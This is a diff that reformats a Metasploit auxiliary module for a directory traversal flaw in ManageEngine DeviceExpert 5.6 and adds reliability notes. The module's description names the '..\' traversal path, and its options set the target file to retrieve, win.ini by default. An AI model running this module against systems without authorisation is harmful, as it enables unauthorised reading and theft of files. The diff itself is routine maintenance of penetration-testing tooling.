@@ -9,34 +9,41 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'ManageEngine DeviceExpert 5.6 ScheduleResultViewer FileName Traversal',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'ManageEngine DeviceExpert 5.6 ScheduleResultViewer FileName Traversal',
+        'Description' => %q{
           This module exploits a directory traversal vulnerability found in ManageEngine
-        DeviceExpert's ScheduleResultViewer Servlet.  This is done by using
-        "..\..\..\..\..\..\..\..\..\..\" in the path in order to retrieve a file on a
-        vulnerable machine.  Please note that the SSL option is required in order to send
-        HTTP requests.
-      },
-      'References'     =>
-        [
+          DeviceExpert's ScheduleResultViewer Servlet.  This is done by using
+          "..\..\..\..\..\..\..\..\..\..\" in the path in order to retrieve a file on a
+          vulnerable machine.  Please note that the SSL option is required in order to send
+          HTTP requests.
+        },
+        'References' => [
           [ 'OSVDB', '80262']
         ],
-      'Author'         =>
-        [
-          'rgod',   #Discovery
+        'Author' => [
+          'rgod', # Discovery
           'sinn3r'
         ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => '2012-03-18'
-    ))
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2012-03-18',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(6060),
-        OptBool.new('SSL',   [true, 'Use SSL', true]),
+        OptBool.new('SSL', [true, 'Use SSL', true]),
         OptString.new('FILEPATH', [true, 'The name of the file to download', 'windows\\win.ini'])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -80,7 +87,8 @@ class MetasploitModule < Msf::Auxiliary
         'application/octet-stream',
         ip,
         res.body,
-        fname)
+        fname
+      )
 
       print_good("#{ip}:#{rport} - File saved in: #{path}")
     end
